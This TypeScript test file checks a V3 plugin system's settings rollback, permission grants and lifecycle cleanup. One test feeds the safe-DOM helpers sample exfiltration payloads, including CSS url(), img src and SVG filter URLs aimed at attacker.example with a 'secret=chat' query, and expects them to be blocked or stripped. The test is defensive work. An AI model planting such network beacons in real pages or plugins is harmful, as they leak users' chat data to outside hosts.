    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    await expect(api.setChatToIndex(0, 0, { ...existingChat, name: 'New chat' })).rejects.toThrow('chat rejected')
  })
})

describe('V3 plugin settings rollback', () => {
  it('delegates a named color scheme change to its single persistence owner', () => {
    mockServerCommands.canUse = true
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    void api.changeColorScheme('dracula')

    expect(dispatchDurableServerBackedSettingsPatch).toHaveBeenCalledOnce()
    expect(dispatchDurableServerBackedSettingsPatch).toHaveBeenCalledWith(
      expect.objectContaining({
        patch: expect.objectContaining({ colorSchemeName: 'dracula' }),
      }),
    )
  })

  it('does not resolve a theme mutation before its durable command settles', async () => {
    mockServerCommands.canUse = true
    ;(mockDbState.db as any).textTheme = 'standard'
    let resolveCommand!: (value: any) => void
    vi.mocked(dispatchDurableServerBackedSettingsPatch).mockReturnValueOnce(
      new Promise((resolve) => {
        resolveCommand = resolve
      }),
    )
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any
    let settled = false

    const mutation = api.changeTextTheme('highcontrast').then(() => {
      settled = true
    })
    await Promise.resolve()

    expect(settled).toBe(false)
    resolveCommand({
      status: 'ok',
      revision: 2,
      event: { type: 'settings.updated', revision: 2, resource: 'settings' },
    })
    await mutation
    expect(settled).toBe(true)
  })

  it('rejects a theme mutation after a terminal settings failure', async () => {
    mockServerCommands.canUse = true
    ;(mockDbState.db as any).textTheme = 'standard'
    vi.mocked(dispatchDurableServerBackedSettingsPatch).mockResolvedValueOnce({
      status: 'error',
      error: 'theme rejected',
    })
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    await expect(api.changeTextTheme('highcontrast')).rejects.toThrow('theme rejected')
  })

  it('I-12: keeps a newer theme value when a failed plugin settings rollback is stale', () => {
    mockServerCommands.canUse = true
    ;(mockDbState.db as any).textTheme = 'standard'
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    api.changeTextTheme('highcontrast')
    const rollback = capturedSettingsRollback()

    expect(dispatchDurableServerBackedSettingsPatch).toHaveBeenCalledWith(
      expect.objectContaining({
        acknowledgeOptimistic: true,
        patch: { textTheme: 'highcontrast' },
      }),
    )

    expect((mockDbState.db as any).textTheme).toBe('highcontrast')
    ;(mockDbState.db as any).textTheme = 'newer-local-theme'
    vi.mocked(updateColorScheme).mockClear()
    vi.mocked(updateTextThemeAndCSS).mockClear()

    rollback()

    expect((mockDbState.db as any).textTheme).toBe('newer-local-theme')
    expect(updateColorScheme).not.toHaveBeenCalled()
    expect(updateTextThemeAndCSS).not.toHaveBeenCalled()
  })

  it('I-12: restores the previous theme value when live state still equals the attempted patch', () => {
    mockServerCommands.canUse = true
    ;(mockDbState.db as any).textTheme = 'standard'
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    api.changeTextTheme('highcontrast')
    const rollback = capturedSettingsRollback()
    vi.mocked(updateColorScheme).mockClear()
    vi.mocked(updateTextThemeAndCSS).mockClear()

    rollback()

    expect((mockDbState.db as any).textTheme).toBe('standard')
    expect(updateColorScheme).not.toHaveBeenCalled()
    expect(updateTextThemeAndCSS).toHaveBeenCalledTimes(1)
  })
})

describe('V3 plugin permissions', () => {
  it('does not create a V3 guest when trusted browser runtime access is denied', async () => {
    const plugin = { ...seedV3Plugin('denied-runtime'), script: 'globalThis.ran = true' }
    mockDbState.db.plugins = [plugin]
    vi.mocked(alertConfirm).mockResolvedValueOnce(false)
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined)

    await executePluginV3(plugin)

    expect(getV3PluginInstance(plugin.name)).toBeUndefined()
    expect(document.querySelector('iframe')).toBeNull()
    expect(alertConfirm).toHaveBeenCalledOnce()
  })

  it('requires a new trusted runtime decision after the V3 script changes', async () => {
    const first = { ...seedV3Plugin('changing-runtime'), script: 'void "first"' }
    const second = { ...seedV3Plugin('changing-runtime'), script: 'void "second"' }
    mockDbState.db.plugins = [first]
    vi.mocked(alertConfirm).mockResolvedValueOnce(true).mockResolvedValueOnce(false)
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined)

    await loadV3Plugins([first])
    expect(getV3PluginInstance(first.name)).toBeDefined()
    mockDbState.db.plugins = [second]
    await loadV3Plugins([second])

    expect(getV3PluginInstance(second.name)).toBeUndefined()
    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it('does not reuse a granted capability for another capability from the same plugin', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    vi.mocked(alertConfirm).mockResolvedValueOnce(true).mockResolvedValueOnce(false)

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(true)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'mainDom')).resolves.toBe(false)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(true)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'mainDom')).resolves.toBe(false)

    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it('does not let an update-source grant satisfy the plugin runtime network capability', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    const updateURL = 'https://plugins.example/plugin.js'
    mockDbState.db.plugins = [plugin]
    vi.mocked(alertConfirm).mockResolvedValueOnce(true).mockResolvedValueOnce(false)

    await expect(
      __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'pluginUpdate', false, plugin.script, undefined, {
        updateURL,
      }),
    ).resolves.toBe(true)
    await expect(
      __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'network', false, plugin.script),
    ).resolves.toBe(false)
    await expect(
      __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'pluginUpdate', false, plugin.script, undefined, {
        updateURL,
      }),
    ).resolves.toBe(true)

    expect(alertConfirm).toHaveBeenNthCalledWith(1, `update:${plugin.name}:${updateURL}`)
    expect(alertConfirm).toHaveBeenNthCalledWith(2, `network:${plugin.name}`)
  })

  it('does not reuse an update grant for another declared HTTPS source', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    vi.mocked(alertConfirm).mockResolvedValueOnce(true).mockResolvedValueOnce(false)

    await expect(
      __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'pluginUpdate', false, plugin.script, undefined, {
        updateURL: 'https://first.example/plugin.js',
      }),
    ).resolves.toBe(true)
    await expect(
      __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'pluginUpdate', false, plugin.script, undefined, {
        updateURL: 'https://second.example/plugin.js',
      }),
    ).resolves.toBe(false)

    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it('does not reuse a denied capability for another capability from the same plugin', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    vi.mocked(alertConfirm).mockResolvedValueOnce(false).mockResolvedValueOnce(true)

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(false)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'mainDom')).resolves.toBe(true)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(false)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'mainDom')).resolves.toBe(true)

    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it('keeps decisions for the same capability independent between plugins', async () => {
    const pluginA = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    const pluginB = { ...seedV3Plugin('plugin-b'), script: 'script-b' }
    mockDbState.db.plugins = [pluginA, pluginB]
    vi.mocked(alertConfirm).mockResolvedValueOnce(false).mockResolvedValueOnce(true)

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(pluginA.name, 'db')).resolves.toBe(false)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(pluginB.name, 'db')).resolves.toBe(true)

    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it('continues to honor persisted script-hash grants without prompting', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    mockPermissionForage.values.set('plugin_permission:["plugin-a","hash:script-a","db"]', true)

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(true)

    expect(alertConfirm).not.toHaveBeenCalled()
  })

  it('does not carry an in-memory grant across a script update with the same plugin name', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    vi.mocked(alertConfirm).mockResolvedValueOnce(true).mockResolvedValueOnce(false)

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(true)
    plugin.script = 'script-b'
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(false)

    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it('does not bank a grant when the installed script changes while its prompt is open', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    let resolveConfirmation!: (allowed: boolean) => void
    vi.mocked(alertConfirm).mockImplementationOnce(
      () =>
        new Promise<boolean>((resolve) => {
          resolveConfirmation = resolve
        }),
    )

    const permission = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')
    await vi.waitFor(() => expect(alertConfirm).toHaveBeenCalledOnce())
    plugin.script = 'script-b'
    resolveConfirmation(true)

    await expect(permission).resolves.toBe(false)
    expect(mockPermissionForage.setItem).not.toHaveBeenCalled()
  })

  it('does not reuse a persisted grant for a different plugin with byte-identical source', async () => {
    const pluginA = { ...seedV3Plugin('plugin-a'), script: 'shared-script' }
    const pluginB = { ...seedV3Plugin('plugin-b'), script: 'shared-script' }
    mockDbState.db.plugins = [pluginA, pluginB]
    mockPermissionForage.values.set('plugin_permission:["plugin-a","hash:shared-script","db"]', true)
    vi.mocked(alertConfirm).mockResolvedValueOnce(false)

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(pluginA.name, 'db')).resolves.toBe(true)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(pluginB.name, 'db')).resolves.toBe(false)

    expect(alertConfirm).toHaveBeenCalledTimes(1)
  })

  it('coalesces concurrent non-reconfirm prompts for the same script capability', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    let resolveConfirmation!: (allowed: boolean) => void
    vi.mocked(alertConfirm).mockImplementationOnce(
      () =>
        new Promise<boolean>((resolve) => {
          resolveConfirmation = resolve
        }),
    )

    const first = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')
    const second = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')
    await vi.waitFor(() => expect(alertConfirm).toHaveBeenCalledTimes(1))
    resolveConfirmation(true)

    await expect(Promise.all([first, second])).resolves.toEqual([true, true])
    expect(alertConfirm).toHaveBeenCalledTimes(1)
  })

  it('bypasses an in-memory grant when explicit reconfirmation is requested', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(true)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', true)).resolves.toBe(true)

    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it.each([true, 'periodically'] as const)(
    'coalesces concurrent %s reconfirmation prompts for the same script capability',
    async (reconfirm) => {
      const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
      mockDbState.db.plugins = [plugin]
      let resolveConfirmation!: (allowed: boolean) => void
      vi.mocked(alertConfirm).mockImplementationOnce(
        () =>
          new Promise<boolean>((resolve) => {
            resolveConfirmation = resolve
          }),
      )

      const first = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', reconfirm)
      const second = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', reconfirm)
      await vi.waitFor(() => expect(alertConfirm).toHaveBeenCalledTimes(1))
      resolveConfirmation(true)

      await expect(Promise.all([first, second])).resolves.toEqual([true, true])
      expect(alertConfirm).toHaveBeenCalledTimes(1)
    },
  )

  it('reconfirms a periodic capability after its grant expires', async () => {
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    const now = vi.spyOn(Date, 'now').mockReturnValue(1_000)

    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', 'periodically')).resolves.toBe(
      true,
    )
    now.mockReturnValue(1_001)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', 'periodically')).resolves.toBe(
      true,
    )
    now.mockReturnValue(1_000 + 3 * 24 * 60 * 60 * 1_000 + 1)
    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', 'periodically')).resolves.toBe(
      true,
    )

    expect(alertConfirm).toHaveBeenCalledTimes(2)
  })

  it('returns a failed provider result without invoking plugin code when permission is denied', async () => {
    vi.spyOn(console, 'warn').mockImplementation(() => {})
    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
    mockDbState.db.plugins = [plugin]
    vi.mocked(alertConfirm).mockResolvedValueOnce(false)
    const provider = vi.fn(async () => ({ success: true, content: 'provider response' }))
    const api = __v3PluginLifecycleTestHooks.createApi(plugin) as any
    api.addProvider('denied-provider', provider)
    const registeredProvider = pluginV2.providers.get('denied-provider')
    const arg = { mode: 'normal' } as any

    await expect(registeredProvider?.(arg)).resolves.toEqual({ success: false, content: 'Permission denied' })

    expect(provider).not.toHaveBeenCalled()
    expect(arg.mode).toBe('normal')
  })
})

describe('V3 plugin lifecycle cleanup', () => {
  it('M7/v4-L37: loadV3Plugins unloads every existing V3 instance from a snapshot', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {})
    const removeSpy = vi.spyOn(window, 'removeEventListener')

    const pluginA = seedV3Plugin('plugin-a')
    const pluginB = seedV3Plugin('plugin-b')
    mockDbState.db.plugins = [pluginA, pluginB]
    await executePluginV3(pluginA)
    await executePluginV3(pluginB)

    expect(getV3PluginInstance('plugin-a')).toBeTruthy()
    expect(getV3PluginInstance('plugin-b')).toBeTruthy()

    await loadV3Plugins([])

    expect(getV3PluginInstance('plugin-a')).toBeUndefined()
    expect(getV3PluginInstance('plugin-b')).toBeUndefined()
    expect(messageCalls(removeSpy)).toHaveLength(2)
  })

  it('M7/L43: throwing unload callbacks do not skip SandboxHost or provider cleanup', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {})
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
    const removeSpy = vi.spyOn(window, 'removeEventListener')

    const plugin = seedV3Plugin('plugin-a')
    mockDbState.db.plugins = [plugin]
    await executePluginV3(plugin)
    __v3PluginLifecycleTestHooks.addUnloadCallback('plugin-a', () => {
      throw new Error('unload failed')
    })
    __v3PluginLifecycleTestHooks.registerProvider('plugin-a', 'owned')

    await __v3PluginLifecycleTestHooks.unloadPlugin('plugin-a')

    expect(errorSpy).toHaveBeenCalledWith(
      expect.stringContaining('Error running unload callback for plugin plugin-a:'),
      expect.any(Error),
    )
    expect(getV3PluginInstance('plugin-a')).toBeUndefined()
    expect(pluginV2.providers.has('owned')).toBe(false)
    expect(get(customProviderStore)).toEqual([])
    expect(messageCalls(removeSpy)).toHaveLength(1)
  })

  it('L43: custom provider stores dedupe by provider name and unload by plugin ownership', async () => {
    const firstHandler = vi.fn(async () => ({ success: true, content: 'first' }))
    const secondHandler = vi.fn(async () => ({ success: true, content: 'second' }))

    __v3PluginLifecycleTestHooks.registerProvider('plugin-a', 'shared', firstHandler)
    __v3PluginLifecycleTestHooks.registerProvider('plugin-a', 'shared', firstHandler)
    __v3PluginLifecycleTestHooks.registerProvider('plugin-b', 'shared', secondHandler)

    expect(get(customProviderStore)).toEqual(['shared'])
    expect(customV3ProviderMetaStore.map((model) => model.id)).toEqual(['pluginmodel:::shared'])
    expect(pluginV2.providers.get('shared')).toBe(secondHandler)

    await __v3PluginLifecycleTestHooks.unloadPlugin('plugin-b')

    expect(get(customProviderStore)).toEqual(['shared'])
    expect(customV3ProviderMetaStore).toHaveLength(1)
    expect(pluginV2.providers.get('shared')).toBe(firstHandler)

    await __v3PluginLifecycleTestHooks.unloadPlugin('plugin-a')

    expect(get(customProviderStore)).toEqual([])
    expect(customV3ProviderMetaStore).toHaveLength(0)
    expect(pluginV2.providers.has('shared')).toBe(false)
    expect(pluginV2.providerOptions.has('shared')).toBe(false)
  })

  it('L43: unloading a V3 provider does not remove a same-name provider reloaded by V2', async () => {
    const v2ReloadedHandler = vi.fn(async () => ({ success: true, content: 'v2' }))

    __v3PluginLifecycleTestHooks.registerProvider('plugin-a', 'shared')
    pluginV2.providers.set('shared', v2ReloadedHandler)
    pluginV2.providerOptions.set('shared', {})

    await __v3PluginLifecycleTestHooks.unloadPlugin('plugin-a')

    expect(pluginV2.providers.get('shared')).toBe(v2ReloadedHandler)
    expect(get(customProviderStore)).toEqual(['shared'])
    expect(customV3ProviderMetaStore).toHaveLength(0)
  })

  it('I-11: ignores stale provider registration after a newer V3 load', async () => {
    const oldPlugin = seedV3Plugin('plugin-old')
    const newPlugin = seedV3Plugin('plugin-new')

    mockDbState.db.plugins = [oldPlugin]
    await loadV3Plugins([oldPlugin])
    const oldInstance = getV3PluginInstance('plugin-old')
    expect(oldInstance).toBeTruthy()
    const oldApi = __v3PluginLifecycleTestHooks.createApiForInstance(oldPlugin, oldInstance as any) as any

    mockDbState.db.plugins = [newPlugin]
    await loadV3Plugins([newPlugin])
    const newInstance = getV3PluginInstance('plugin-new')
    expect(newInstance).toBeTruthy()
    const newApi = __v3PluginLifecycleTestHooks.createApiForInstance(newPlugin, newInstance as any) as any
    const newHandler = vi.fn(async () => ({ success: true, content: 'new' }))

    newApi.addProvider('provider-new', newHandler)

    expect(() =>
      oldApi.addProvider(
        'provider-old',
        vi.fn(async () => ({ success: true, content: 'old' })),
      ),
    ).toThrow(/no longer active/)
    expect(pluginV2.providers.has('provider-old')).toBe(false)
    expect(pluginV2.providers.has('provider-new')).toBe(true)
    expect(get(customProviderStore)).toEqual(['provider-new'])
    expect(customV3ProviderMetaStore.map((model) => model.id)).toEqual(['pluginmodel:::provider-new'])
  })

  it('I-11: ignores stale custom UI registration after a newer V3 load', async () => {
    const oldPlugin = seedV3Plugin('plugin-old')
    const newPlugin = seedV3Plugin('plugin-new')

    mockDbState.db.plugins = [oldPlugin]
    await loadV3Plugins([oldPlugin])
    const oldInstance = getV3PluginInstance('plugin-old')
    expect(oldInstance).toBeTruthy()
    const oldApi = __v3PluginLifecycleTestHooks.createApiForInstance(oldPlugin, oldInstance as any) as any

    mockDbState.db.plugins = [newPlugin]
    await loadV3Plugins([newPlugin])
    const newInstance = getV3PluginInstance('plugin-new')
    expect(newInstance).toBeTruthy()
    const newApi = __v3PluginLifecycleTestHooks.createApiForInstance(newPlugin, newInstance as any) as any

    newApi.registerButton(
      { name: 'New button', icon: '', iconType: 'none', location: 'action', id: 'shared-button' },
      vi.fn(),
    )

    expect(() =>
      oldApi.registerButton(
        { name: 'Old late button', icon: '', iconType: 'none', location: 'action', id: 'old-late-button' },
        vi.fn(),
      ),
    ).toThrow(/no longer active/)
    expect(additionalFloatingActionButtons.map((button) => ({ id: button.id, name: button.name }))).toEqual([
      { id: 'shared-button', name: 'New button' },
    ])
  })

  it('I-11: delayed old menu cleanup does not remove a newer same-id button', async () => {
    const oldPlugin = seedV3Plugin('plugin-shared')
    const oldRuntime = __v3PluginLifecycleTestHooks.createTrackedApi(oldPlugin)
    const oldApi = oldRuntime.api as any

    oldApi.registerButton(
      { name: 'Old button', icon: '', iconType: 'none', location: 'action', id: 'shared-button' },
      vi.fn(),
    )
    expect(additionalFloatingActionButtons.map((button) => button.name)).toEqual(['Old button'])

    __v3PluginLifecycleTestHooks.beginGeneration()
    const newRuntime = __v3PluginLifecycleTestHooks.createTrackedApi(seedV3Plugin('plugin-shared'))
    const newApi = newRuntime.api as any
    newApi.registerButton(
      { name: 'New button', icon: '', iconType: 'none', location: 'action', id: 'shared-button' },
      vi.fn(),
    )

    await __v3PluginLifecycleTestHooks.unloadInstance(oldRuntime.instance)

    expect(additionalFloatingActionButtons.map((button) => ({ id: button.id, name: button.name }))).toEqual([
      { id: 'shared-button', name: 'New button' },
    ])

    await __v3PluginLifecycleTestHooks.unloadInstance(newRuntime.instance)

    expect(additionalFloatingActionButtons).toHaveLength(0)
  })

  it('moves a re-registered button to its newly requested location', async () => {
    const runtime = __v3PluginLifecycleTestHooks.createTrackedApi(seedV3Plugin('plugin-moving-button'))
    const api = runtime.api as any
    const firstCallback = vi.fn()
    const movedCallback = vi.fn()

    api.registerButton(
      { name: 'Floating button', icon: '', iconType: 'none', location: 'action', id: 'moving-button' },
      firstCallback,
    )
    api.registerButton(
      { name: 'Chat button', icon: '', iconType: 'none', location: 'chat', id: 'moving-button' },
      movedCallback,
    )

    expect(additionalFloatingActionButtons).toHaveLength(0)
    expect(additionalHamburgerMenu).toHaveLength(0)
    expect(additionalChatMenu.map((button) => ({ id: button.id, name: button.name }))).toEqual([
      { id: 'moving-button', name: 'Chat button' },
    ])

    additionalChatMenu[0].callback()
    expect(firstCallback).not.toHaveBeenCalled()
    expect(movedCallback).toHaveBeenCalledOnce()

    await __v3PluginLifecycleTestHooks.unloadInstance(runtime.instance)
    expect(additionalChatMenu).toHaveLength(0)
  })

  it('scopes shared UI ids to each plugin owner', async () => {
    const pluginA = __v3PluginLifecycleTestHooks.createTrackedApi(seedV3Plugin('plugin-a'))
    const pluginB = __v3PluginLifecycleTestHooks.createTrackedApi(seedV3Plugin('plugin-b'))
    const apiA = pluginA.api as any
    const apiB = pluginB.api as any

    apiA.registerSetting('Settings A', vi.fn(), '', 'none', 'settings')
    apiB.registerSetting('Settings B', vi.fn(), '', 'none', 'settings')
    apiA.registerButton(
      { name: 'Action A', icon: '', iconType: 'none', location: 'action', id: 'main-action' },
      vi.fn(),
    )
    apiB.registerButton(
      { name: 'Action B', icon: '', iconType: 'none', location: 'action', id: 'main-action' },
      vi.fn(),
    )

    expect(additionalSettingsMenu.map((menu) => menu.name)).toEqual(['Settings A', 'Settings B'])
    expect(additionalFloatingActionButtons.map((button) => button.name)).toEqual(['Action A', 'Action B'])

    apiA.unregisterUIPart('settings')
    apiA.unregisterUIPart('main-action')

    expect(additionalSettingsMenu.map((menu) => menu.name)).toEqual(['Settings B'])
    expect(additionalFloatingActionButtons.map((button) => button.name)).toEqual(['Action B'])

    await __v3PluginLifecycleTestHooks.unloadInstance(pluginA.instance)
    expect(additionalSettingsMenu.map((menu) => menu.name)).toEqual(['Settings B'])
    expect(additionalFloatingActionButtons.map((button) => button.name)).toEqual(['Action B'])
  })

  it('cleans up each plugin MCP with its registration identity across reload and unload', async () => {
    const identifier = 'plugin:shared-tools'
    const oldRegistration = { generation: 'old' }
    const newRegistration = { generation: 'new' }
    vi.mocked(registerMCPModule)
      .mockResolvedValueOnce(oldRegistration as any)
      .mockResolvedValueOnce(newRegistration as any)
    const getToolList = vi.fn(async () => [])
    const callTool = vi.fn(async () => [])

    const oldRuntime = __v3PluginLifecycleTestHooks.createTrackedApi(seedV3Plugin('plugin-shared'))
    await (oldRuntime.api.registerMCP as Function)(
      {
        identifier,
        name: 'Old tools',
        version: '1.0.0',
        description: 'Old plugin generation.',
      },
      getToolList,
      callTool,
    )

    __v3PluginLifecycleTestHooks.beginGeneration()
    const newRuntime = __v3PluginLifecycleTestHooks.createTrackedApi(seedV3Plugin('plugin-shared'))
    await (newRuntime.api.registerMCP as Function)(
      {
        identifier,
        name: 'New tools',
        version: '2.0.0',
        description: 'Current plugin generation.',
      },
      getToolList,
      callTool,
    )

    await __v3PluginLifecycleTestHooks.unloadInstance(oldRuntime.instance)

    expect(unregisterMCPModule).toHaveBeenCalledWith(identifier, oldRegistration)
    expect(unregisterMCPModule).not.toHaveBeenCalledWith(identifier, newRegistration)

    await __v3PluginLifecycleTestHooks.unloadInstance(newRuntime.instance)

    expect(unregisterMCPModule).toHaveBeenCalledWith(identifier, newRegistration)
  })

  it('v4-L37: unload cleanup removes SafeElement document listeners exactly once', async () => {
    const lifecycle = __v3PluginLifecycleTestHooks.createLifecycle()
    const safeDocument = __v3PluginLifecycleTestHooks.createSafeDocument(lifecycle)
    const listener = vi.fn()

    await safeDocument.addEventListener('click', listener)
    document.dispatchEvent(new MouseEvent('click'))

    lifecycle.cleanupAll()
    lifecycle.cleanupAll()
    document.dispatchEvent(new MouseEvent('click'))

    expect(listener).toHaveBeenCalledTimes(1)
  })

  it('keeps main-document HTML and CSS helpers network-dead', () => {
    const lifecycle = __v3PluginLifecycleTestHooks.createLifecycle()
    const safeDocument = __v3PluginLifecycleTestHooks.createSafeDocument(lifecycle)
    const element = safeDocument.createElement('div')

    expect(() => element.setStyle('backgroundImage', 'url(https://attacker.example/?secret=chat)')).toThrow(
      /not allowed|network-loading/i,
    )
    expect(() => element.setStyle('color', 'red')).not.toThrow()
    expect(() =>
      element.setStyleAttribute('color: blue; background-image: url(https://attacker.example/style)'),
    ).toThrow(/network-loading/i)

    element.setInnerHTML(`
      <img src="https://attacker.example/html">
      <svg><rect filter="url(https://attacker.example/filter)" fill="url(https://attacker.example/fill)"></rect></svg>
      <span class="kept">safe</span>
    `)
    expect(element.getInnerHTML()).toContain('<span class="kept">safe</span>')
    expect(element.getInnerHTML()).not.toContain('attacker.example')
    expect(element.getInnerHTML()).not.toMatch(/(?:filter|fill)="url/i)
    expect(safeDocument.createElement('img').nodeName()).toBe('DIV')
    expect(safeDocument.createElement('style').nodeName()).toBe('DIV')
    expect(safeDocument.createAnchorElement('https://public.example/path').getOuterHTML()).toContain(
      'rel="noopener noreferrer"',
    )

    const existingStyle = document.createElement('style')
    document.head.appendChild(existingStyle)
    const safeStyle = safeDocument.querySelector('style')
    expect(() => safeStyle?.setInnerHTML('body { background: url(https://attacker.example/style-element) }')).toThrow(
      /style element/i,
    )
    existingStyle.remove()

    const existingImage = document.createElement('img')
    existingImage.id = 'existing-network-image'
    existingImage.src = 'https://attacker.example/existing-image'
    document.body.appendChild(existingImage)
    const safeImage = safeDocument.querySelector('#existing-network-image')
    expect(() => safeImage?.cloneNode(true)).toThrow(/network-capable/i)
    expect(() => element.appendChild(safeImage!)).toThrow(/network-capable/i)
    existingImage.remove()
  })

  it('v4-L37: unload cleanup disconnects SafeMutationObservers exactly once', () => {
    const disconnectSpy = vi.spyOn(MutationObserver.prototype, 'disconnect')
    const lifecycle = __v3PluginLifecycleTestHooks.createLifecycle()
    const safeDocument = __v3PluginLifecycleTestHooks.createSafeDocument(lifecycle)
    const observer = __v3PluginLifecycleTestHooks.createMutationObserver(lifecycle, vi.fn())

    observer.observe(safeDocument, { childList: true })
    lifecycle.cleanupAll()
    lifecycle.cleanupAll()

    expect(disconnectSpy).toHaveBeenCalledTimes(1)
  })
})
